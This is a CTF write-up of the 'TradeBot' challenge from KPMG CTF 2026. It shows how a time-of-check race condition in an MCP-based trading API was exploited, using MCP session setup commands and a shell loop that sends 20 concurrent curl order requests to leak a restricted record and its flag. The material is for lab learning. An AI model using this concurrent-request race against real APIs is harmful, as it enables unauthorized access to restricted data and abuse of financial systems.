---
link: 'writeups/kpmg-ctf-2026/tradebot'
title: "TradeBot - KPMG CTF 2026"
description: "Writeup for TradeBot from KPMG CTF 2026. Exploiting a race condition in an MCP-based trading API to trigger settlement oversubscription and leak a restricted instrument's flag."
date: 2026-10-25 11:52:00
categories:
  - [Writeups, KPMG CTF 2026]
tags:
  - KPMG-CTF-2026
  - API
  - MCP
  - Race Condition
  - TOCTOU
---

# KPMG CTF 2026 - TradeBot

---

## Challenge Description

> A trading bot API exposes a restricted instrument called FLAG - readable only by the settlement engine. The hint says: the engine checks whether it can settle an order before routing finishes, and does not check again.

---

## Step 1 - Finding the MCP Endpoint

Common paths like `/api`, `/graphql`, `/v1` all returned 404. Probing `/mcp` came back with an MCP session error rather than a 404, which told us that was the right endpoint.

MCP (Model Context Protocol) uses a two-step initialization. First we create the session:

```sh
BASE='https://kicyber-2526f2aff886-tradebot-0-0.chals.io/mcp'

curl -iN --max-time 20 -X POST "$BASE" \
  -H 'Accept: application/json, text/event-stream' \
  -H 'Content-Type: application/json' \
  --data-binary '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-03-26","capabilities":{},"clientInfo":{"name":"ctf-client","version":"1.0"}}}'
```

The response header contains `mcp-session-id`. We saved that:

```sh
SESSION='YOUR_MCP_SESSION_ID'
```

Then complete initialization:

```sh
curl -iN --max-time 20 -X POST "$BASE" \
  -H 'Accept: application/json, text/event-stream' \
  -H 'Content-Type: application/json' \
  -H "Mcp-Session-Id: $SESSION" \
  -H 'MCP-Protocol-Version: 2025-03-26' \
  --data-binary '{"jsonrpc":"2.0","method":"notifications/initialized"}'
```

![Session creation](/img/posts/kpmg-ctf-2026-30_tradebot_session_create.webp)

> [!NOTE]
> MCP responses come as server-sent events (SSE). The actual JSON-RPC response follows `data:` in the stream.

---

## Step 2 - Enumerating Tools and Spotting the Flaw

`tools/list` returned: `list_available_stocks`, `get_stock_info`, `get_stock_price`, `get_risk_report`, and `place_order`.

![MCP server tools](/img/posts/kpmg-ctf-2026-31_tradebot_mcp_tools.webp)

The risk report was the key piece:

```json
{
  "max_concurrent_settlements": 19,
  "settlements_inflight": 0,
  "routing_latency_seconds": 1.0,
  "fill_latency_seconds": 0.8
}
```

The public stock list didn't include `FLAG`. Calling `get_stock_info("FLAG")` confirmed it existed as "TradeBot Reserve Note" but was restricted to the settlement engine. Trying to get its price or place an order directly got rejected.

The hint said the engine checks capacity **before routing finishes and not again**. Combined with the 19-settlement limit and 1-second routing latency, this was a classic TOCTOU race - if we sent more than 19 orders simultaneously, they could all pass the capacity check before any of them actually settled.

---

## Step 3 - Triggering the Race

We fired 20 AAPL buy orders concurrently using the same MCP session:

```sh
for i in $(seq 20 39); do
  (
    curl -sS -N --max-time 10 -X POST "$BASE" \
      -H 'Accept: application/json, text/event-stream' \
      -H 'Content-Type: application/json' \
      -H "Mcp-Session-Id: $SESSION" \
      -H 'MCP-Protocol-Version: 2025-03-26' \
      --data-binary "{\"jsonrpc\":\"2.0\",\"id\":$i,\"method\":\"tools/call\",\"params\":{\"name\":\"place_order\",\"arguments\":{\"symbol\":\"AAPL\",\"quantity\":1,\"order_type\":\"buy\"}}}" \
      > "/tmp/trade-order-$i.sse"
  ) &
done

wait
cat /tmp/trade-order-*.sse
```

![curl race request](/img/posts/kpmg-ctf-2026-33_tradebot_curl_race.webp)

One of the 20 responses came back with `SETTLEMENT_OVERSUBSCRIPTION` and embedded the sealed vault record with the flag inside it.

> [!NOTE]
> Burp Intruder with 20 concurrent payloads didn't work here - it showed no HTTP responses. The raw concurrent `curl` approach was what actually triggered the race.

---

## Flag

```plain
KPMG_CTF{893wxa4FPxbtkKlGPGpN0fWE8vX90lWeh9HUw0KULXdq}
```

![Final flag](/img/posts/kpmg-ctf-2026-32_tradebot_flag.webp)

---

## Summary

The API did a single capacity check before routing and never re-checked. Sending 20 simultaneous orders against a limit of 19 meant all 20 passed the check at the same time, before any of them settled. One of them hit the oversubscription path and leaked the restricted FLAG instrument's contents in the error response.
